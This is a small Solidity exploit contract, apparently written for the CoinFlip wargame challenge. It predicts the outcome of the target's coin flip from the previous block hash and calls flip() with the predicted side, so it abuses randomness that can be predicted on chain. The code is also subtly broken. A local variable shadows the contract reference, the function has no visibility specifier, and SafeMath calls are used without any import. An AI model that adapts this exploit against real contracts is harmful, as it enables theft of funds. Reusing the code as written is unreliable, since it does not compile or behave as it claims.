// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract MalicousContract {

    CoinFlip public coinFlip = CoinFlip(ADDRESS_OF_CHALLENGE);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exploit(bool _guess){

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            coinFlip.flip(_guess);
        } else {
            coinFlip.flip(!_guess);
        }
    }
}